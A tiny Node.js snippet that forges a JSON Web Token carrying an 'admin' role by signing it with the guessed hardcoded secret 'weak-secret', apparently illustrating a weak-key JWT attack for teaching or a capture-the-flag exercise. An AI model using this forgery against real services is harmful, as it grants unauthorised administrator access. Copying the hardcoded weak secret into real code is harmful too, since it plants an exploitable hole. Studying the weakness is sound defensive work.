const jwt = require("jsonwebtoken");

const forgedToken = jwt.sign(
  { id: "1234567890", role: "admin" },
  "weak-secret"
);

console.log(forgedToken);